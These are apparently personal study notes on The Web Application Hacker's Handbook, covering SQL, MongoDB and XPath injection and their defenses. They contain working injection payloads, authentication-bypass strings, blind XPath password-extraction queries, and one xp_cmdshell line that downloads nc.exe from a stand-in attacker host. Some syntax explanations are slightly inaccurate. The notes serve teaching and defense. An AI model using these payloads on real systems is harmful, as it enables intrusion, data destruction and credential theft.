**Note:** This is the fourth installment of my notes and reflections from The Web Application Hacker's Handbook. These reminders are neither exhaustive nor definitive—they're simply a personal tool to help me absorb, understand, and organize new material in a way that works for me.

## SQL Syntax and Error Reference:

We have described numerous techniques that enable you to probe for and exploit SQL injection vulnerabilities in web applications. In many cases, there are minor differences between the syntax that you need to employ against different back-end database platforms. Furthermore, every database produces different error messages whose meaning you need to understand both when probing for flaws and when attempting to craft an effective exploit. The following sections provide a brief cheat sheet that you can use to look up the exact syntax you need for a particular task and to decipher any unfamiliar error messages you encounter.

### Preventing SQL Injection:

Despite all its different manifestations and the complexities that can arise in its exploitation, SQL injection is, in general, one of the easier vulnerabilities to prevent. Nevertheless, discussions about SQL injection countermeasures are frequently misleading, and many people rely on defensive measures that are only partially effective.

#### Partially Effective Measures:

Because of the prominence of the single quotation mark (```'```) in standard explanations of SQL injection flaws, a common approach to preventing attacks is to escape any single quotation marks within user input by doubling them. You have already seen two situations in which this approach fails:

1. Numeric User-Supplied Data:

If numeric user-supplied data is being embedded into SQL queries, this data is not typically encapsulated within single quotation marks. This means an attacker can break out of the data context and begin injecting arbitrary SQL without needing a single quotation mark.

Consider the following insecure query:

```
SELECT * FROM users WHERE user_id = $input;
```

An attacker could input:

```
1; DROP TABLE users; --
```

This results in:

```
SELECT * FROM users WHERE user_id = 1; DROP TABLE users; --;
```

Since ```user_id``` is a number, there are no single quotes, making escaping them useless.

2. Second-Order SQL Injection:

Second-order SQL injection occurs when data that has been properly escaped upon initial insertion later gets retrieved and used in another SQL query, leading to an injection vulnerability.

Imagine an application that allows users to set a "nickname." The input is properly escaped when inserted into the database:

```
INSERT INTO users (username, nickname) VALUES ('admin', 'O\'Malley');
```

Later, when this nickname is retrieved and used in another SQL query without re-escaping:

```
SELECT * FROM messages WHERE recipient = 'O'Malley';
```

**Additional Notes:**

The backslash (```\```) is not normally used to escape single quotes in SQL Server. However, whether it works depends on the SQL mode and database system you are using.

SQL Server (T-SQL) → Uses ```''``` for Escaping. So, in SQL Server, this would not work:

```
INSERT INTO users (username, nickname) VALUES ('admin', 'O\'Malley');
```

The backslash is just treated as a regular character, not an escape character. The correct way in SQL Server:

```
INSERT INTO users (username, nickname) VALUES ('admin', 'O''Malley');
```

MySQL and PostgreSQL (in certain modes) → Uses ```\``` for Escaping. In MySQL (non-strict mode) and some configurations of PostgreSQL, backslashes can act as escape characters:

```
INSERT INTO users (username, nickname) VALUES ('admin', 'O\'Malley');
```

This works in MySQL/PostgreSQL if ```ANSI_QUOTES``` or ```SQL_MODE``` allows it. But in strict SQL mode (```ANSI_QUOTES``` in MySQL), you would also need to use double single quotes like in SQL Server:

```
INSERT INTO users (username, nickname) VALUES ('admin', 'O''Malley');
```



#### Stored Procedures and Their Limitations:

Another countermeasure that is often cited is the use of stored procedures for all database access. While stored procedures can improve security and performance, they are not a guaranteed solution to prevent SQL injection.

**1. Poorly Written Stored Procedures:**

Stored procedures can still be vulnerable to SQL injection if they are poorly written and concatenate user input.

Example: Vulnerable Stored Procedure (SQL Server):

```
CREATE PROCEDURE GetUser
    @username NVARCHAR(50)
AS
BEGIN
    EXEC('SELECT * FROM users WHERE username = ''' + @username + '''');
END;
```

This procedure is vulnerable because it dynamically constructs a SQL query. An attacker could supply:

```
' OR 1=1; --
```

Which results in:

```
SELECT * FROM users WHERE username = '' OR 1=1; --';
```

Allowing the attacker to bypass authentication.

**Additional Notes:**

This part of the code:

```
EXEC('SELECT * FROM users WHERE username = ''' + @username + '''');
```

is dynamically constructing an SQL query inside a string. Since SQL Server uses single quotes (```'```) to denote string literals, we need to properly escape them.

Breaking it down a bit more:

1. The base query inside EXEC:

We are trying to construct the following SQL statement dynamically:

```
SELECT * FROM users WHERE username = 'someuser'
```

Notice that ```someuser``` is enclosed in single quotes.

2. The problem: Embedding a variable (```@username```) inside a string:

In SQL Server, a single quote (```'```) inside a string must be escaped by doubling it (```''```).

3. How many single quotes do we need?

- The outermost ```EXEC(' ... ')``` expects a string.

- Inside that string, the ```SELECT * FROM users WHERE username = ...``` requires the username to be inside single quotes.

To include a single quote inside an SQL string, we escape it by doubling it (```''```).

Final Breakdown of Each Quote:

```
EXEC('SELECT * FROM users WHERE username = ''' + @username + '''');
```

- ```EXEC('```: Opens the dynamic SQL string.

- ```SELECT * FROM users WHERE username = '```: Starts the query, adding the first single quote before the username.

- ```''' + @username + ''''```: ```@username``` is inserted, enclosed in escaped single quotes.

- ```')```: Closes the dynamic SQL string.

So if ```@username = 'admin'```, the final query executed becomes:

```
SELECT * FROM users WHERE username = 'admin'
```

Simplifying the Quotes:

If you wanted to write this using parameterized queries, you wouldn't need this crazy escaping:

```
DECLARE @query NVARCHAR(MAX)
SET @query = N'SELECT * FROM users WHERE username = @username'
EXEC sp_executesql @query, N'@username NVARCHAR(50)', @username;
```

This is safer and avoids SQL injection entirely.

**Secure Alternative: Parameterized Query:**

```
CREATE PROCEDURE GetUser
    @username NVARCHAR(50)
AS
BEGIN
    SELECT * FROM users WHERE username = @username;
END;
```

By binding the parameter properly, SQL injection is prevented.

**Additional Notes:**

While both examples shown here use parameterized queries, which are much safer than string concatenation, there are key differences!

The ```sp_executesql``` Approach:

```
DECLARE @query NVARCHAR(MAX)  
SET @query = N'SELECT * FROM users WHERE username = @username'  
EXEC sp_executesql @query, N'@username NVARCHAR(50)', @username;
```

- Dynamic execution: The query is stored in a variable and executed at runtime.

- Potential issues: If user input is dynamically used to modify the query string before execution, it could reintroduce SQL injection risks.

- Use case: Best when queries need to be dynamically constructed based on conditions, but parameters must always be handled correctly.

The Stored Procedure Approach:

```
CREATE PROCEDURE GetUser  
    @username NVARCHAR(50)  
AS  
BEGIN  
    SELECT * FROM users WHERE username = @username;  
END;
```

- Precompiled execution: The database compiles and caches the execution plan, improving performance.

- Strict parameterization: Since the query is hardcoded within the stored procedure, there's no risk of dynamic manipulation.

- More secure in practice: Even if a user controls @username, they cannot alter the query structure itself.

- Preferred for: Reusability, security, and performance.

Which is Better?

Stored procedures are generally the safer and preferred option because they are precompiled and don’t rely on dynamic query execution. However, both can be dangerous if misused—for example, if a stored procedure internally concatenates user input into a SQL string, it becomes vulnerable again.

Best Practice (Modern-Day Standards):

- Always use strict parameterization.

- Avoid dynamically building queries when possible.

- Use least privilege principles (i.e., restrict stored procedure execution permissions).

- Monitor and log executions to detect unusual activity.

**2. Unsafe Invocation of Stored Procedures:**

Even a well-written stored procedure can be vulnerable if it is invoked unsafely.

Unsafe Execution:

```
EXEC sp_RegisterUser 'joe', 'secret';
```

If an attacker supplies:

```
foo'; EXEC master..xp_cmdshell 'tftp wahh-attacker.com GET nc.exe'--
```

The resulting execution:

```
EXEC sp_RegisterUser 'joe', 'foo'; EXEC master..xp_cmdshell 'tftp wahh-attacker.com GET nc.exe'--'
```

Allows remote code execution (RCE) via SQL injection.

How to Secure It:

- Use parameterized queries instead of concatenating user input.

- Disable dangerous stored procedures (e.g., ```xp_cmdshell``` in SQL Server).

- Restrict database privileges to prevent unauthorized actions.

Stored procedures do not automatically prevent SQL injection. They are useful only if implemented correctly. The best defense remains parameterized queries and least privilege principles.

### Parameterized Queries:

Most modern databases and application development frameworks offer APIs to safely handle user input, preventing SQL injection vulnerabilities. A key defense mechanism is parameterized queries (also called prepared statements), which separate query structure from data input. This process involves two main steps:

1. **Defining the query structure** – The application constructs the SQL statement using placeholders (```?``` or named parameters) instead of inserting raw user input.

2. **Binding values to placeholders** – The application supplies the actual user input, which is securely handled by the database API.

Since the query structure is set in stone before user input is introduced, no crafted data can alter the statement’s logic. The API ensures that user-supplied values are treated as data, not executable SQL code.

The following Java snippet demonstrates an unsafe SQL query, where user input is directly concatenated into the query string:

```
// Unsafe query: vulnerable to SQL injection
String userInput = request.getParameter("name");
String queryText = "SELECT ename, sal FROM emp WHERE ename = '" + userInput + "'";

// Execute the query
Statement stmt = con.createStatement();
ResultSet rs = stmt.executeQuery(queryText);
```

Since the user input is embedded directly into the SQL statement, an attacker could inject malicious SQL commands by supplying a crafted ```name``` parameter (e.g., ```name=' OR '1'='1```).

**Additional Notes:**

1. The "ename" and "sal" Columns:

- ```ename``` (Employee Name) and ```sal``` (Salary) are common abbreviations in database schemas, especially in HR/payroll-related tables. These aren’t SQL keywords but just column names following typical naming conventions.

2. The SQL Injection Risk:

This code directly concatenates user input into the SQL query string, making it vulnerable to SQL injection:

```
String queryText = "SELECT ename, sal FROM emp WHERE ename = '" + userInput + "'";
```

- If ```userInput``` is ```"Robert'); DROP TABLE emp; --"```, the final query becomes:

```
SELECT ename, sal FROM emp WHERE ename = 'Robert'); DROP TABLE emp; --'
```

- The ```);``` closes the original query.

- ```DROP TABLE emp;``` deletes the ```emp``` table.

- ```--``` comments out anything after, preventing syntax errors.

3. The Single and Double Quotes Situation:

Let's analyze:

```
'" + userInput + "'"
```

- The outer double quotes (```"```) define the Java String.

- The inner single quotes (```'```) are required by SQL to mark string literals.

- If ```userInput = "Alice"```, then: 

```
SELECT ename, sal FROM emp WHERE ename = 'Alice'
```

- The final query includes ```'Alice'``` as a string value in SQL.

- The issue? If ```userInput``` includes a single quote (```'```), it breaks the query or allows injection.

A safe version of the same query uses prepared statements with parameterized placeholders:

```
// Secure query using a parameterized statement
String queryText = "SELECT ename, sal FROM emp WHERE ename = ?";

// Prepare the statement
PreparedStatement stmt = con.prepareStatement(queryText);
stmt.setString(1, request.getParameter("name"));

// Execute the query safely
ResultSet rs = stmt.executeQuery();
```

Here, ```?``` serves as a placeholder, and ```setString(1, value)``` assigns the user input without altering the query structure. The database engine treats the input strictly as a value, eliminating the risk of SQL injection.

To maximize the security of parameterized queries, follow these best practices:

1. Use parameterized queries consistently.

- Some developers selectively apply them based on whether user input is "obvious." This is dangerous, as indirect user-controlled input (e.g., from session variables or logs) can introduce SQL injection vulnerabilities. It is safer to mandate parameterized queries for all database interactions.

2. Fully parameterize all user-supplied data.

- A common mistake is to parameterize most inputs but concatenate a few values directly into the query. Even a single unparameterized value can lead to SQL injection.

3. Placeholders cannot be used for table or column names.

- SQL placeholders (```?```) work only for values, not database structure elements like table names or column names. If dynamic table/column selection is necessary, use a whitelist of allowed values and strictly validate input (e.g., only alphanumeric characters, no spaces).

4. SQL keywords cannot be parameterized.

- Query elements like ```ORDER BY``` directions (```ASC```/```DESC```) or operators cannot be parameterized. Again, whitelisting is the safest approach—reject any unexpected input or enforce strict validation.

#### Defense in Depth:

A robust security approach should always employ defense-in-depth measures to provide additional protection if frontline defenses fail. In the context of attacks against back-end databases, three layers of further defense can be applied:

- **Use Least Privilege Access:** The application should operate with the lowest possible database privileges. In general, it does not require DBA-level permissions but only needs to read and write its own data. For security-critical situations, the application can use different database accounts for different tasks. For instance, if 90% of queries require only read access, they should be executed using an account without write privileges. If a query only needs access to a subset of data (e.g., the orders table but not the user accounts table), an account with minimal necessary access should be used. Enforcing this principle throughout the application can significantly limit the impact of any residual SQL injection vulnerabilities.

- **Disable Unnecessary Database Functions:** Many enterprise databases include a vast amount of default functionality that attackers can exploit if they gain the ability to execute arbitrary SQL statements. Wherever possible, unnecessary functions should be removed or disabled. While a skilled attacker may attempt to recreate missing functions through alternative means, database hardening still creates significant barriers and makes exploitation more difficult.

- **Apply Security Patches Promptly:** All vendor-issued security patches should be evaluated, tested, and applied in a timely manner to fix known database vulnerabilities. In security-critical environments, database administrators can subscribe to advance-notification services to learn about vulnerabilities before vendor patches are released. This allows them to implement temporary mitigation measures until official fixes are available.

### Injecting into NoSQL:

The term NoSQL refers to various data stores that deviate from traditional relational database architectures. Unlike SQL databases, NoSQL databases use **key/value mappings** and do not rely on a fixed schema, such as a conventional database table. Keys and values can be arbitrarily defined, and the format of the value is generally irrelevant to the data store. Additionally, key/value storage allows values to be **nested data structures**, enabling hierarchical storage—something that traditional relational databases do not natively support.

NoSQL databases offer several advantages, particularly in handling **large-scale datasets**. Their hierarchical structure allows optimization tailored to specific data retrieval needs, reducing overhead. In contrast, relational databases may require complex cross-referencing of multiple tables to achieve the same result.

From a web application security perspective, the key concern is **how the application queries data**, as this determines what forms of injection are possible. Unlike SQL, which has a broadly similar syntax across different database products, NoSQL refers to a **diverse set of technologies**, each with unique query mechanisms and security challenges. Some of the common query methods used by NoSQL databases include:

- **Key/value lookups** (common in databases like Redis)

- **XPath-based queries** (used in some XML-based NoSQL stores)

- **JavaScript-based queries** (MongoDB, for example, allows JavaScript execution within queries)

NoSQL is a relatively new technology that has evolved rapidly. It has not yet been deployed at the same scale as mature relational databases like MySQL, PostgreSQL, or Oracle, but its use is growing in cloud-native and high-performance applications. Security research into NoSQL-related vulnerabilities is still developing, and as NoSQL adoption increases, so will the discovery of exploitable injection flaws.

Unlike SQL injection, which manipulates a standardized query language, NoSQL injection attacks exploit specific **query patterns and weak input validation mechanisms** in individual NoSQL implementations. These attacks often appear different from traditional SQL injection but can be just as dangerous if an attacker gains control over the application's query logic.

It is almost certain that more exploitable vulnerabilities will arise in how NoSQL databases are used in today's and future web applications. The next section explores a real-world NoSQL injection example, illustrating how these attacks can be leveraged to compromise data integrity and security.

#### Injecting into MongoDB:

MongoDB injections are less discussed than SQL injections but can be just as dangerous. Since MongoDB uses JavaScript for queries, an injection often leads to full JavaScript execution, which can be exploited further with server-side JavaScript attacks. Consider the following example, which performs a login based on user records in a MongoDB data store:

```
$m = new MongoClient();
$db = $m->cmsdb;
$collection = $db->user;

$js = "function() { return this.username == '$username' && this.password == '$password'; }";

$obj = $collection->findOne(array('$where' => $js));

if (isset($obj["uid"])) {
    $logged_in = 1;
} else {
    $logged_in = 0;
}
```

**Detailed Breakdown:**

```
$m = new MongoClient();
```

- Creates a connection to a MongoDB server using the ```MongoClient``` class.

- The ```MongoClient``` class is now deprecated, and in modern PHP versions, ```MongoDB\Driver\Manager``` should be used instead.

```
$db = $m->cmsdb;
```

Selects the database named ```cmsdb``` from the MongoDB server.

```
$collection = $db->user;
```

- Selects the collection named ```user``` inside the ```cmsdb``` database. In SQL terms, think of this as choosing a specific **table** to query.

```
$js = "function() { return this.username == '$username' && this.password == '$password'; }";
```

- Creates a JavaScript function as a string that will later be passed to MongoDB’s query engine.

- The function compares the document's ```username``` and ```password``` fields against user input values (```$username``` and ```$password```).

- The JavaScript function gets injected with user-provided input, which is dangerous because attackers can manipulate the query structure.

```
$obj = $collection->findOne(array('$where' => $js));
```

- Performs a query using MongoDB's ```$where``` operator.

- ```$where``` allows JavaScript execution inside the query, making it a potential injection point.

- MongoDB will evaluate the function provided in ```$js```, scanning through all documents in the collection and executing it against each one.

```
if (isset($obj["uid"])) {
    $logged_in = 1;
} else {
    $logged_in = 0;
}
```

Checks if a matching user document was found:

- If ```findOne()``` returns a document containing a ```uid``` field, authentication is considered successful, and ```$logged_in = 1;```.

- ```findOne()``` is a MongoDB query method that retrieves a single document from a collection that matches a given query. If multiple documents match the query, ```findOne()``` returns only the first matching document it finds (based on default ordering).

- You can also specify query conditions to narrow down the search:

```
$user = $collection->findOne(['username' => 'Misty']);
```

- This searches for a document where ```username == "Misty"``` and returns only one result. If there’s no matching document, ```findOne()``` returns ```null```.

Now, let’s analyze how this embedded JavaScript function works:

```
function() { return this.username == '$username' && this.password == '$password'; }
```

- This function is executed inside MongoDB, iterating through the ```user``` collection.

- The ```this``` keyword refers to the current document being checked.

- ```this.username == '$username'``` checks if the document’s ```username``` field matches the supplied value.

- ```this.password == '$password'``` checks if the document’s ```password``` field matches the supplied value.

- If both conditions are ```true```, the function returns ```true```, meaning MongoDB retrieves this user’s document.

Now, let's go step by step on how could be exploited. If a user inputs:

```
Marcus'//
```

The final JavaScript function would become:

```
function() { return this.username == 'Marcus'//' && this.password == 'aaa'; }
```

Since ```//``` is a comment in JavaScript, everything after it (including the password check) is ignored. The condition now only checks for ```this.username == 'Marcus'```, bypassing the password requirement.

Also, if a user inputs:

```
a' || 1==1 || 'a'=='a
```

The final JavaScript function turns into:

```
function() { return this.username == 'a' || 1==1 || 'a'=='a' && this.password == 'aaa'; }
```

Breaking this down:

- ```this.username == 'a'``` → Either the username is "```a```" **OR**, will return ```true``` if a user named "```a```" exists.

- ```1==1``` → **Always true**, forcing MongoDB to retrieve all documents. so the function evaluates to true and allows login.

- ```'a'=='a'``` → **Also always true**, reinforcing the bypass.

Thus, authentication is bypassed, and the attacker gains access.

To prevent MongoDB injection:

1. **Use Parameterized Queries:** Avoid passing user input directly into ```$where```. Instead, use:

```
$obj = $collection->findOne([
    'username' => $username,
    'password' => $password
]);
```

This ensures MongoDB treats values as data, not code.

2. **Disable ```$where``` Queries:** If possible, disable the ```$where``` operator in MongoDB's security settings.

3. **Sanitize Inputs:** Ensure usernames and passwords do not contain special characters like ```'```, ```"```, ```//```, ```||```, etc.

### Injecting into XPath:

The XML Path Language (XPath) is an interpreted language used to **navigate XML documents** and retrieve data from them. In most cases, an XPath expression represents a sequence of steps required to move from one node in a document to another.

When web applications store data within XML documents, they may use XPath to access the data based on user input. If this input is embedded into the XPath query without proper filtering or sanitization, an attacker may be able to manipulate the query to interfere with the application's logic or extract unauthorized data. In short, XPath injection is similar to SQL injection but targets XML-based storage instead of databases.

While XML documents are not the preferred choice for storing enterprise data (since databases are more efficient), they are often used for:

- Storing **application configuration data**, which may be accessed based on user input.

- Smaller applications that persist simple information like user credentials, roles, and privileges.

For example, consider the following XML data store:

```
<addressBook>
    <address>
        <firstName>William</firstName>
        <surname>Gates</surname>
        <password>MSRocks!</password>
        <email>billyg@microsoft.com</email>
        <ccard>5130 8190 3282 3515</ccard>
    </address>
    <address>
        <firstName>Chris</firstName>
        <surname>Dawes</surname>
        <password>secret</password>
        <email>cdawes@craftnet.de</email>
        <ccard>3981 2491 3242 3121</ccard>
    </address>
    <address>
        <firstName>James</firstName>
        <surname>Hunter</surname>
        <password>letmein</password>
        <email>james.hunter@pookmail.com</email>
        <ccard>8113 5320 8014 3313</ccard>
    </address>
</addressBook>
```

Retrieving all emails looks like this:

```
//address/email/text()
```

**Additional Notes:**

- ```//``` means **“select nodes from anywhere in the document”**, regardless of hierarchy. It’s a wildcard operator, allowing flexible data retrieval.

- ```//address``` → Selects all ```<address>``` elements.

- ```/email``` → Goes inside each ```<address>``` and selects the ```<email>``` tag.

- ```/text()``` → Extracts only the content of ```<email>```, leaving out the tags.

To retrieve all details of the user Chris Dawes, we use:

```
//address[surname/text()='Dawes']
```

**Additional Notes:**

- ```//address``` → Selects all ```<address>``` elements.

- ```[surname/text()='Dawes']``` → **Filters** results, returning only the ```<address>``` where ```<surname>``` equals ```'Dawes'```.

#### Subverting Application Logic (XPath Injection):

Consider an application that retrieves a user’s stored credit card number based on a username and password. To verify user credentials and return the credit card number, the following XPath query is used:

```
//address[surname/text()='Dawes' and password/text()='secret']/ccard/text()
```

**Additional Notes:**

- ```//address``` → Selects all ```<address>``` elements.

- ```[surname/text()='Dawes' and password/text()='secret']``` → Filters results to match: ```surname = 'Dawes'``` and ```password = 'secret'```-

- ```/ccard/text()``` → Retrieves only the credit card number for the matching user.

If user input is **directly inserted** into this XPath query **without sanitization**, an attacker can inject malicious input—similar to SQL injection.

For example, entering the following password:

```
' or 'a'='a  
```

would transform the query into:

```
//address[surname/text()='Dawes' and password/text='' or 'a'='a']/ccard/text()
```

- The or ```'a'='a``` part breaks the logic, making the condition always true. The original query already provides the closing single quote after inserting the user input. If we tried injecting:

```
' or 'a'='a'
```

Then the resulting XPath would look like this (incorrect):

```
//address[surname/text()='Dawes' and password/text='' or 'a'='a'']/ccard/text()
```

This would break the query because there would be an **extra single quote** that XPath wouldn’t expect.

- Overall, the password condition is now always true because ```'a'='a'``` is **always valid**.

- The ```or``` operator **invalidates** the password check, meaning any user’s credit card details can be retrieved—no password needed! This is essentially an authentication bypass, allowing attackers to log in as any user.

Unlike SQL, XPath has **case-sensitive** keywords and element names. That means:

- ```//address``` is not the same as ```//ADDRESS```.

- ```and``` is different from ```AND```.

- SQL injection often targets numeric fields, which don’t require quotes.

- XPath injections usually target text-based fields, so quotes are often necessary.

#### Informed XPath Injection:

XPath injection flaws can be exploited to retrieve arbitrary information from within the target XML document. Much like SQL injection, one reliable way to exploit these vulnerabilities is by causing the application to behave differently depending on a condition specified by the attacker.

Consider the following two passwords submitted to the application:

1. ```' or 1=1 and 'a'='a```

2. ```' or 1=2 and 'a'='a```

In the first case, the condition ```1=1``` is always true, so the application returns results. In the second case, ```1=2``` is always false, so no results are returned. This behavior difference can be used to test the truth of any condition specified in the XPath query, which helps in extracting arbitrary information one byte at a time.

Let's break down the following example for extracting a password, where the attacker is testing each character of the password for the user "Gates."

```
' or //address[surname/text()='Gates' and substring(password/text(),1,1)='M'] and 'a'='a
```

Here’s a breakdown:

1. ```' or ```: This opens the XPath query, allowing the attacker to inject their condition.

2. ```//address[surname/text()='Gates' and substring(password/text(),1,1)='M']```: This part of the query is looking for an ```<address>``` element where:

- The ```surname``` is "Gates".

- The first character of the ```password``` is ```'M'```, extracted using the ```substring()``` function (the ```substring()``` function extracts a specific part of a string, in this case, the first character of the password).

3. ```and 'a'='a```: This part ensures the query always evaluates to true, guaranteeing the injection will work if the condition holds.

4. ```'```: Closes the injected condition.

5. ```and 'a'='a```: This ensures that the malicious condition doesn’t interfere with the original query structure.

**Additional Notes:**

The syntax here is a bit different from what we're used to in traditional programming, and that's what makes it tricky at first glance. Let's deconstruct it a bit more step by step:

- ```//address[...]``` → This selects all ```<address>``` nodes in the XML document that match the conditions inside ```[...]```.

- ```surname/text()='Gates'``` → This condition ensures we are dealing with an ```<address>``` node where the ```<surname>``` child node's text content is ```"Gates"```.

- ```substring(password/text(),1,1)='M'``` → ```password/text()``` extracts the text inside the ```<password>``` element for the matched ```<address>``` node. ```substring(..., 1,1)``` takes the first character of that password. The ```='M'``` part checks if that first character is ```"M"```.

- ```and 'a'='a'``` → This, as we discussed before, helps maintain query structure and ensures the injection succeeds.

**Why is it structured this way?**

XPath has two styles of functions:

1. **Functions that take an argument outside parentheses**, like ```text()```, which acts like an accessor—retrieving the text inside a tag and comparing it directly to a value (```surname/text()='Gates'```).

2. **Inline functions that manipulate data**, like ```substring()```, which extracts a part of the text from an element (```substring(password/text(),1,1)='M'```).

This is different from, say, SQL, where we'd expect all function arguments to be enclosed in parentheses. Here, the function placement depends on whether it's filtering a node (```text()```) or modifying a string (```substring()```).

Overall, this results in XPath Query:

```
/address[surname/text()='Gates' and substring(password/text(),1,1)='M' and 'a'='a']/ccard/text()
```

This query checks if the first character of the password for user "Gates" is ```'M'```. If it is, the query returns the credit card information (```ccard/text()```).

By repeating this process for each character of the password and testing all possible characters (A-Z, 0-9, etc.), an attacker can fully extract the password of the target user. For example:

- **For character 1**: Check if ```substring(password/text(),1,1)``` equals 'A', 'B', ..., 'Z', etc.

- **For character 2**: Use ```substring(password/text(),2,1)``` and test all possible values.

- Continue this process for every character in the password.

#### Blind XPath Injection - Refined & Expanded:

In the previous XPath injection example, the attack relied on knowing specific details about the XML document's structure—such as node names (```address```, ```surname```, and ```password```). However, **blind XPath injection** removes this requirement, allowing an attacker to extract data even when they have no prior knowledge of the document structure.

XPath allows for **relative navigation**, meaning an attacker can move between nodes using positional references instead of explicit names. Additionally, XPath includes **meta-functions** that reveal structural information about the XML document. These techniques make it possible to completely enumerate the document’s contents without knowing anything beforehand.

**Analogy**: This is conceptually similar to **path traversal attacks** in file systems, where an attacker moves through directories (```../../etc/passwd```). Instead of navigating folders, the attacker is traversing XML nodes, revealing their names and contents step by step.

- ```parent::*``` moves up, while ```child::*``` iterates down.

- The ```name()``` function helps discover node names, while ```count()``` and ```string-length()``` optimize attacks.

If an attacker doesn’t know the structure of an XML document, they can begin by identifying the name of the **current node’s parent**. This is done using the ```name()``` function and **wildcard selectors**:

```
or substring(name(parent::*[position()=1]),1,1)= 'a
```

**Breakdown:**

1. ```parent::*``` → Selects the parent node of the current node, regardless of its name (```*``` is a wildcard).

2. ```parent::*[position()=1]``` → Ensures we are selecting the **first parent node** (useful if multiple parents exist).

3. ```name(parent::*[position()=1])``` → Retrieves the **name** of the parent node.

4. ```substring(name(...),1,1)= 'a'``` → Checks if the **first letter** of the parent's name is ```a```.

By cycling through all possible characters, an attacker can brute-force the parent node's name, one letter at a time.

The attacker sends multiple injection attempts, each testing a different letter:

```
or substring(name(parent::*[position()=1]),1,1) = 'a'
or substring(name(parent::*[position()=1]),2,1) = 'd'
or substring(name(parent::*[position()=1]),3,1) = 'd'
or substring(name(parent::*[position()=1]),4,1) = 'r'
or substring(name(parent::*[position()=1]),5,1) = 'e'
or substring(name(parent::*[position()=1]),6,1) = 's'
or substring(name(parent::*[position()=1]),7,1) = 's'
```

Since the parent node's name is ```"address"```, the first six queries will return false, but the seventh will return true, confirming that the seventh letter is ```"s"```. By iterating through every position, the attacker reconstructs ```"address"```.

Once an attacker knows the **parent node's name**, they can cycle through **child nodes** without knowing their names. Instead of using ```name()```, they reference them **by position**:

```
//address[position()=3]/child::*[position()=4]/text()
```

**Breakdown:**

1. ```//address[position()=3]``` → Selects the **third** ```<address>``` node.

2. ```child::*[position()=4]``` → Selects the **fourth unnamed child node** of this address.

3. ```/text()``` → Extracts the **text content** of that node.

This method allows an attacker to extract data **without knowing any field names**. They simply iterate through all child nodes, reconstructing their names and values.

Once the attacker can blindly navigate the XML structure, they can extract **specific values**—such as a user's password—one character at a time.

Example query targeting the sixth child node of the first ```<address>``` element:

```
' or substring(//address[position()=1]/child::*[position()=6]/text(),1,1) = 'M' and 'a'='a
```

**Breakdown:**

1. ```//address[position()=1]``` → Targets the **first** ```<address>``` node.

2. ```child::*[position()=6]``` → Selects its **sixth child node** (assumed to be ```password```).

3. ```text()``` → Retrieves the **text value** of this node.

4. ```substring(...,1,1) = 'M'``` → Checks if the **first character** of the value is ```'M'```.

5. ```and 'a'='a'``` → Ensures the injection doesn’t break the query structure.

The attacker can iterate through every character position and test every possible letter to reconstruct the entire password.

To **optimize the attack**, XPath provides two useful functions:

1. ```count()``` → Returns the number of child nodes, helping determine how many positions to test.

2. ```string-length()``` → Returns the length of a string, helping determine how many characters to extract.

**Example: Counting Nodes!**

```
count(//address[position()=1]/child::*)
```

Returns how many child nodes exist inside the first ```<address>``` element.

**Example: Checking Password Length!**

```
string-length(//address[position()=1]/child::*[position()=6]/text())
```

Returns the number of characters in the password, telling the attacker how many queries are needed to extract it.

Overall, by leveraging:

- Relative node navigation (parent/child relationships)

- Position-based selection (instead of known names)

- Meta-functions (```name()```, ```count()```, ```string-length()```)

- Character-by-character brute-force extraction

An attacker can fully enumerate both the structure and contents of an XML document without any prior knowledge!

#### Finding XPath Injection Flaws:

Many of the attack strings commonly used to test for SQL injection can also cause anomalous behavior when submitted to a function vulnerable to XPath injection. This means that preliminary SQLi tests can often reveal an XPath injection flaw—even if the developer didn't use SQL at all.

**Initial Probing Techniques:**

Certain strings, when injected into an XPath query, can invalidate its syntax and cause errors, much like malformed SQL injection attempts. While my book didn't do a great job on explaining these, some typical test cases include:

- Single quote test:

```
'
```

If the application throws an error, it suggests that user input is being incorporated into an XPath query.

Boolean condition test:

```
' or '1'='1
```

If the application processes this without errors or changes behavior, it might indicate that input is influencing the XPath logic.

**Additional Notes:**

If the application **does not** produce any noticeable errors or changes in behavior when you inject something like:

```
' or '1'='1
```

then it might mean **one of three things**:

1. **The input is sanitized or not used in an XPath query** – If the application properly escapes input or doesn’t use it in a query at all, injection won’t work.

2. **The application doesn’t visibly display errors or changes** – XPath injection, like Blind SQL Injection, often doesn’t give immediate feedback. The query may still be affected, but you won’t see obvious signs.

3. **The injected condition didn’t alter the query’s outcome** – If the query was already returning results before injection, ```or '1'='1'``` wouldn’t change much.

Since errors and direct output may not appear, you can try **Boolean-based testing** with different conditions and observe any tiny difference in how the app responds. Try submitting:

```
' or '1'='1' and '1'='2
```

- If your previous test (```or '1'='1'```) worked but this one **doesn’t**, it means your input (the **second** one, shown above) is being processed within an XPath query. In other words, this **must always evaluate to false**. If the first test **allowed access** (or changed behavior) but this one denied access (or changed behavior back), it confirms that the input is indeed being processed within an XPath query.

- If both conditions return the same result, either: the input isn’t affecting anything, or the query’s logic doesn’t make a difference in output.

If there's no clear behavioral difference, try:

- **Time delays (if applicable)** – Some XPath engines allow functions that introduce noticeable delays, like ```count(//*[name()='foo' and substring('test',1,1)='t']) > 0```.

- **Checking response length** – If a webpage returns different-sized responses based on input, XPath injection might be at play.

- **Inferential techniques** – Inject conditions that should selectively remove/add parts of the result, and compare outputs carefully. So, if there’s no obvious behavior change, move to blind techniques instead of assuming there’s no vulnerability. Sometimes the injection is happening, but the effects aren’t obvious at first!

**Testing for Blind XPath Injection:**

Just like in SQL injection, attackers can use Boolean conditions to test whether input is influencing the query execution. Some key test strings include:

```
or 'a'='a' and 'a'='b'
or 1=1 and 1=2
```

**Breakdown:**

```
or 'a'='a' and 'a'='b'
```

- The first condition (```'a'='a'```) always evaluates to ```true```.

- The second condition (```'a'='b'```) always evaluates to ```false```.

- If the application changes its behavior based on this, it suggests that the logic is being parsed within an XPath expression.

```
or 1=1 and 1=2
```

- Similar concept as above: ```1=1``` is always true, ```1=2``` is always false. If the application behaves differently when this is injected, it means the input is affecting an XPath query.

Once an XPath injection flaw is suspected, the next step is to determine whether blind data extraction is possible.

**Step 1: Probing with ```count()```**

To confirm that injection is possible, you can test with:

```
' or count(parent::*[position()=1])=0 or 'a'='b
' or count(parent::*[position()=1])>0 or 'a'='b
```

**Breakdown:**

- ```parent::*[position()=1]``` selects the first parent node.

- ```count(parent::*[position()=1])=0``` checks whether a parent node exists.

- The OR condition (```or 'a'='b'```) ensures that it does not break the syntax if the first part evaluates to false.

If different responses are observed for these inputs, this indicates that the query structure is being affected by our injection.

For numeric parameters, equivalent tests might be:

```
1 or count(parent::*[position()=1])=0
